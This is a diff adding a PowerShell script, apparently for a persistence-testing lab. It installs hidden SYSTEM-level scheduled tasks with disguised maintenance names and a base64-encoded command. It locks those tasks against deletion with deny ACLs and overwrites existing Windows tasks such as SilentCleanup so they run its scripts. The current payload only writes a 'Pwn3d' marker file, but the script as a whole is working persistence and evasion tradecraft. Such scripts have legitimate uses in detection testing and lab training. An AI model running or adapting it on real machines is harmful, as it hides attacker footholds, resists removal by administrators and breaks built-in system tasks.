@@ -1,0 +1,316 @@
+$taskPath = '\PersistenceShowdownLab\'
+$workDir = Join-Path $env:ProgramData 'PersistenceShowdownLab\ScheduledTasks'
+$payloadPath = 'C:\Users\Public\Documents\pwned.txt'
+$payloadText = 'Pwn3d'
+$psExe = Join-Path $env:WINDIR 'System32\WindowsPowerShell\v1.0\powershell.exe'
+$cmdExe = Join-Path $env:WINDIR 'System32\cmd.exe'
+$wscriptExe = Join-Path $env:WINDIR 'System32\wscript.exe'
+
+$newTaskNames = @(
+    'ProfileCacheStartup',
+    'CloudSyncLogon',
+    'WinUpdateCacheStartup'
+)
+
+$existingTaskCandidates = @(
+    [ordered]@{ TaskPath = '\Microsoft\Windows\Application Experience\'; TaskName = 'ProgramDataUpdater' },
+    [ordered]@{ TaskPath = '\Microsoft\Windows\Customer Experience Improvement Program\'; TaskName = 'Consolidator' },
+    [ordered]@{ TaskPath = '\Microsoft\Windows\DiskCleanup\'; TaskName = 'SilentCleanup' },
+    [ordered]@{ TaskPath = '\Microsoft\Windows\Windows Error Reporting\'; TaskName = 'QueueReporting' },
+    [ordered]@{ TaskPath = '\Microsoft\Windows\Maintenance\'; TaskName = 'WinSAT' },
+    [ordered]@{ TaskPath = '\Microsoft\Windows\Maps\'; TaskName = 'MapsUpdateTask' }
+)
+
+function Write-Step { param([string]$Text) Write-Host "[*] $Text" -ForegroundColor Cyan }
+function Write-OK { param([string]$Text) Write-Host "    [OK] $Text" -ForegroundColor Green }
+function Write-Warn { param([string]$Text) Write-Host "    [WARN] $Text" -ForegroundColor Yellow }
+
+function Get-LabTaskFilePath {
+    param([string]$Path, [string]$Name)
+
+    $relativePath = $Path.Trim('\')
+    $taskRoot = Join-Path $env:WINDIR 'System32\Tasks'
+    if ([string]::IsNullOrWhiteSpace($relativePath)) {
+        return Join-Path $taskRoot $Name
+    }
+    return Join-Path (Join-Path $taskRoot $relativePath) $Name
+}
+
+function Get-LabTaskCacheTreePath {
+    param([string]$Path, [string]$Name)
+
+    $parts = @()
+    $relativePath = $Path.Trim('\')
+    if (-not [string]::IsNullOrWhiteSpace($relativePath)) { $parts += $relativePath }
+    $parts += $Name
+    return "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$($parts -join '\')"
+}
+
+function Add-LabFileDenyRule {
+    param([string]$Path)
+
+    try {
+        if (-not (Test-Path -LiteralPath $Path)) {
+            Write-Warn "ACL hardening skipped, file not found: $Path"
+            return
+        }
+
+        $everyoneSid = New-Object System.Security.Principal.SecurityIdentifier 'S-1-1-0'
+        $rights = [System.Security.AccessControl.FileSystemRights]::Delete -bor
+            [System.Security.AccessControl.FileSystemRights]::Write -bor
+            [System.Security.AccessControl.FileSystemRights]::WriteData -bor
+            [System.Security.AccessControl.FileSystemRights]::AppendData
+        $rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
+            $everyoneSid,
+            $rights,
+            [System.Security.AccessControl.AccessControlType]::Deny
+        )
+
+        $acl = Get-Acl -LiteralPath $Path -ErrorAction Stop
+        $acl.AddAccessRule($rule)
+        Set-Acl -LiteralPath $Path -AclObject $acl -ErrorAction Stop
+        Write-OK "Hardened file ACL: $Path"
+    } catch {
+        Write-Warn "Could not harden file ACL '$Path': $_"
+    }
+}
+
+function Add-LabRegistryDenyRule {
+    param([string]$Path)
+
+    try {
+        if (-not (Test-Path -Path $Path)) {
+            Write-Warn "ACL hardening skipped, registry key not found: $Path"
+            return
+        }
+
+        $everyoneSid = New-Object System.Security.Principal.SecurityIdentifier 'S-1-1-0'
+        $rights = [System.Security.AccessControl.RegistryRights]::Delete -bor
+            [System.Security.AccessControl.RegistryRights]::SetValue
+        $rule = New-Object System.Security.AccessControl.RegistryAccessRule(
+            $everyoneSid,
+            $rights,
+            [System.Security.AccessControl.InheritanceFlags]::None,
+            [System.Security.AccessControl.PropagationFlags]::None,
+            [System.Security.AccessControl.AccessControlType]::Deny
+        )
+
+        $acl = Get-Acl -Path $Path -ErrorAction Stop
+        $acl.AddAccessRule($rule)
+        Set-Acl -Path $Path -AclObject $acl -ErrorAction Stop
+        Write-OK "Hardened registry ACL: $Path"
+    } catch {
+        Write-Warn "Could not harden registry ACL '$Path': $_"
+    }
+}
+
+function Protect-NewLabTask {
+    param([string]$Path, [string]$Name)
+
+    Add-LabFileDenyRule -Path (Get-LabTaskFilePath -Path $Path -Name $Name)
+    Add-LabRegistryDenyRule -Path (Get-LabTaskCacheTreePath -Path $Path -Name $Name)
+}
+
+function Invoke-ScheduledTaskAttempt {
+    param([string]$Name, [scriptblock]$ScriptBlock)
+
+    try {
+        & $ScriptBlock
+    } catch {
+        Write-Warn "Scheduled task attempt '$Name' failed: $_"
+    }
+}
+
+function Get-TaskIdentity {
+    param([string]$Path, [string]$Name)
+    if (-not $Path.EndsWith('\')) { $Path += '\' }
+    return "$Path$Name"
+}
+
+function Remove-NewLabTasks {
+    foreach ($name in $newTaskNames) {
+        try {
+            Unregister-ScheduledTask -TaskName $name -TaskPath $taskPath -Confirm:$false -ErrorAction SilentlyContinue
+            & schtasks.exe /Delete /TN "$taskPath$name" /F 2>$null | Out-Null
+        } catch {}
+    }
+}
+
+function New-PayloadScript {
+    param([string]$Path, [int]$DelaySeconds = 0)
+
+    $content = @"
+`$ErrorActionPreference = 'SilentlyContinue'
+if ($DelaySeconds -gt 0) { Start-Sleep -Seconds $DelaySeconds }
+New-Item -ItemType Directory -Path 'C:\Users\Public\Documents' -Force | Out-Null
+Set-Content -LiteralPath 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -NoNewline -Encoding ASCII
+"@
+    Set-Content -LiteralPath $Path -Value $content -Encoding ASCII -ErrorAction Stop
+}
+
+function New-PayloadVbs {
+    param([string]$Path)
+
+    $content = @'
+On Error Resume Next
+Set fso = CreateObject("Scripting.FileSystemObject")
+If Not fso.FolderExists("C:\Users\Public\Documents") Then
+    fso.CreateFolder("C:\Users\Public\Documents")
+End If
+Set f = fso.CreateTextFile("C:\Users\Public\Documents\pwned.txt", True)
+f.Write "Pwn3d"
+f.Close
+'@
+    Set-Content -LiteralPath $Path -Value $content -Encoding ASCII -ErrorAction Stop
+}
+
+function New-EncodedPayload {
+    $command = "New-Item -ItemType Directory -Path 'C:\Users\Public\Documents' -Force | Out-Null; Set-Content -LiteralPath 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -NoNewline -Encoding ASCII"
+    return [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
+}
+
+function Register-LabTask {
+    param(
+        [string]$Path,
+        [string]$Name,
+        [string]$Description,
+        $Action,
+        $Trigger,
+        [switch]$Hidden,
+        [switch]$ProtectAcl
+    )
+
+    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+    $settingsArgs = @{
+        AllowStartIfOnBatteries = $true
+        DontStopIfGoingOnBatteries = $true
+        StartWhenAvailable = $true
+        MultipleInstances = 'IgnoreNew'
+        ExecutionTimeLimit = (New-TimeSpan -Minutes 5)
+    }
+    if ($Hidden) { $settingsArgs['Hidden'] = $true }
+    $settings = New-ScheduledTaskSettingsSet @settingsArgs
+
+    Register-ScheduledTask -TaskName $Name -TaskPath $Path -Action $Action -Trigger $Trigger -Principal $principal -Settings $settings -Description $Description -Force -ErrorAction Stop | Out-Null
+    Write-OK "Registered $(Get-TaskIdentity $Path $Name)"
+    if ($ProtectAcl) {
+        Protect-NewLabTask -Path $Path -Name $Name
+    }
+}
+
+function Get-HijackTargets {
+    $targets = @()
+    foreach ($candidate in $existingTaskCandidates) {
+        try {
+            $task = Get-ScheduledTask -TaskPath $candidate.TaskPath -TaskName $candidate.TaskName -ErrorAction Stop
+            if ($null -ne $task) {
+                $targets += $candidate
+                if ($targets.Count -ge 2) { break }
+            }
+        } catch {}
+    }
+    return @($targets)
+}
+
+Write-Step "Preparing scheduled task helper files"
+$profileCacheScript = Join-Path $workDir 'profile-cache.ps1'
+$delayedScript = Join-Path $workDir 'userinit-bridge.ps1'
+$vbsScript = Join-Path $workDir 'event-cache.vbs'
+$helpersReady = $false
+try {
+    New-Item -ItemType Directory -Path $workDir -Force -ErrorAction Stop | Out-Null
+    New-PayloadScript -Path $profileCacheScript
+    New-PayloadScript -Path $delayedScript -DelaySeconds 20
+    New-PayloadVbs -Path $vbsScript
+    $helpersReady = $true
+    Write-OK "Helper files written to $workDir"
+} catch {
+    Write-Warn "Could not prepare scheduled task helper files: $_"
+}
+
+Write-Step "Removing previous lab-owned new tasks"
+try {
+    Remove-NewLabTasks
+    Write-OK "Removed lab-owned new tasks if present"
+} catch {
+    Write-Warn "Could not remove previous lab-owned new tasks: $_"
+}
+
+Write-Step "Installing 3 new scheduled task persistence variants"
+$encoded = ''
+try {
+    $encoded = New-EncodedPayload
+} catch {
+    Write-Warn "Could not generate encoded scheduled task payload: $_"
+}
+
+Invoke-ScheduledTaskAttempt 'ProfileCacheStartup' {
+    if (-not $helpersReady) { throw 'helper files were not prepared' }
+    Register-LabTask `
+        -Path $taskPath `
+        -Name 'ProfileCacheStartup' `
+        -Description 'Profile cache maintenance task.' `
+        -Action (New-ScheduledTaskAction -Execute $psExe -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$profileCacheScript`"" -WorkingDirectory $workDir) `
+        -Trigger (New-ScheduledTaskTrigger -AtStartup) `
+        -Hidden `
+        -ProtectAcl
+}
+
+Invoke-ScheduledTaskAttempt 'CloudSyncLogon' {
+    Register-LabTask `
+        -Path $taskPath `
+        -Name 'CloudSyncLogon' `
+        -Description 'Cloud sync logon maintenance task.' `
+        -Action (New-ScheduledTaskAction -Execute $cmdExe -Argument "/c echo $payloadText>$payloadPath") `
+        -Trigger (New-ScheduledTaskTrigger -AtLogOn) `
+        -ProtectAcl
+}
+
+Invoke-ScheduledTaskAttempt 'WinUpdateCacheStartup' {
+    if ([string]::IsNullOrWhiteSpace($encoded)) { throw 'encoded payload was not generated' }
+    Register-LabTask `
+        -Path $taskPath `
+        -Name 'WinUpdateCacheStartup' `
+        -Description 'Windows update cache startup task.' `
+        -Action (New-ScheduledTaskAction -Execute $psExe -Argument "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded") `
+        -Trigger (New-ScheduledTaskTrigger -AtStartup) `
+        -Hidden `
+        -ProtectAcl
+}
+
+Write-Step "Overwriting 2 existing scheduled task names"
+$targets = @(Get-HijackTargets)
+if ($targets.Count -lt 2) {
+    Write-Warn "Only found $($targets.Count) existing task candidate(s). The script will overwrite what it found."
+}
+
+$i = 0
+foreach ($target in $targets) {
+    try {
+        if ($i -eq 0) {
+            if (-not $helpersReady) { throw 'helper files were not prepared' }
+            Register-LabTask `
+                -Path $target.TaskPath `
+                -Name $target.TaskName `
+                -Description 'Windows task maintenance action.' `
+                -Action (New-ScheduledTaskAction -Execute $psExe -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$delayedScript`"" -WorkingDirectory $workDir) `
+                -Trigger (New-ScheduledTaskTrigger -AtStartup) `
+                -Hidden
+        } else {
+            if (-not $helpersReady) { throw 'helper files were not prepared' }
+            Register-LabTask `
+                -Path $target.TaskPath `
+                -Name $target.TaskName `
+                -Description 'Windows script host maintenance action.' `
+                -Action (New-ScheduledTaskAction -Execute $wscriptExe -Argument "//B `"$vbsScript`"" -WorkingDirectory $workDir) `
+                -Trigger (New-ScheduledTaskTrigger -AtStartup)
+        }
+        $i++
+    } catch {
+        Write-Warn "Could not overwrite $(Get-TaskIdentity $target.TaskPath $target.TaskName): $_"
+    }
+}
+
+Write-Host ""
+Write-Host "[DONE] Installed scheduled task persistences." -ForegroundColor Green
+Write-Host "Created 3 new tasks and attempted to overwrite 2 existing task candidates." -ForegroundColor Yellow
